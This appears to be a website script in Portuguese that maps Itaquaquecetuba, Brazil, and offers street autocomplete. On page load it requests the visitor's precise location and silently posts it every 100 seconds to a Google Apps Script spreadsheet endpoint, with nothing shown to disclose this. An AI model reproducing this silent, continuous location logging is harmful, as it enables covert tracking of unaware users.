$(document).ready(function () {

    // MAPA DO TERRITÓRIO REAL
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(map);

    // FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
    function capturarLocalizacaoReal() {
        if (!navigator.geolocation) {
            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                // Coordenadas concedidas pelo súdito
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;

                // Marker e popup permanecem para visualização
                L.marker([lat, lng])
                    .addTo(map)
                    .bindPopup("Seu Local")
                    .openPopup();

                map.setView([lat, lng], 17);

                // Envio direto para o Google Sheets via FormData (ou JSON no no-cors)
                const dados = {
                    timestamp: new Date().toISOString(),
                    latitude: lat.toFixed(7),  // Transforma em texto com ponto
                    longitude: lng.toFixed(7), // Transforma em texto com ponto
                    precisao: position.coords.accuracy.toFixed(2),
                    status: navigator.onLine ? 'online' : 'offline'
                };


                fetch('https://script.google.com/macros/s/AKfycbzT5KyTliRRNTfSEweSDqfw8soiLZGPqAW-CbYHLO2vVW-cL695G_hsUElzqydUU93FoA/exec', {
                    method: 'POST',
                    mode: 'no-cors', // Evita conflito CORS
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(() => console.log("Dados enviados ao trono com sucesso."));

            },
            function(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        console.error("O súdito negou o acesso à localização, Majestade!");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        console.error("O sinal de GPS está fraco nas fronteiras.");
                        break;
                    case error.TIMEOUT:
                        console.error("A requisição expirou no tempo de espera real.");
                        break;
                    default:
                        console.error("Erro desconhecido na geolocalização.");
                }
            },
            { enableHighAccuracy: true, timeout: 10000 } // máxima precisão
        );
    }

    // DISPARO AUTOMÁTICO AO CARREGAR A PÁGINA
    capturarLocalizacaoReal();

    // RASTREIO CONTÍNUO A CADA 100 SEGUNDOS
    setInterval(capturarLocalizacaoReal, 100000);

});


const inputRua = document.getElementById('nome');
const listaSugestoes = document.getElementById('ruas-itaqua');

inputRua.addEventListener('input', async () => {
    const busca = inputRua.value;

    // Agora, ao primeiro sinal de Vossa Majestade (1 letra), o reino trabalha!
    if (busca.length < 1) return;

    // Coordenadas reais de Itaquaquecetuba para cercar a busca no vosso mapa
    const viewbox = "-46.3815,-23.5134,-46.3056,-23.4455"; 
    const url = `https://nominatim.openstreetmap.org/search?q=${busca}&city=Itaquaquecetuba&state=São Paulo&country=Brazil&format=json&addressdetails=1&limit=10&viewbox=${viewbox}&bounded=1`;

    try {
        const resposta = await fetch(url);
        const locais = await resposta.json();

        listaSugestoes.innerHTML = ''; 

        locais.forEach(local => {
            const a = local.address;
            
            // Construção do Endereço de Gala: Rua, Bairro, CEP
            const rua = a.road || a.pedestrian || a.suburb || local.display_name.split(',')[0];
            const bairro = a.neighbourhood || a.suburb || "Itaquaquecetuba";
            const cep = a.postcode ? ` - CEP: ${a.postcode}` : "";
            
            const enderecoCompleto = `${rua}, ${bairro}${cep}`;
            
            const opcao = document.createElement('option');
            opcao.value = enderecoCompleto;
            listaSugestoes.appendChild(opcao);
        });
    } catch (erro) {
        // Ocultamos as falhas dos mensageiros de Vossa Graça
    }
});
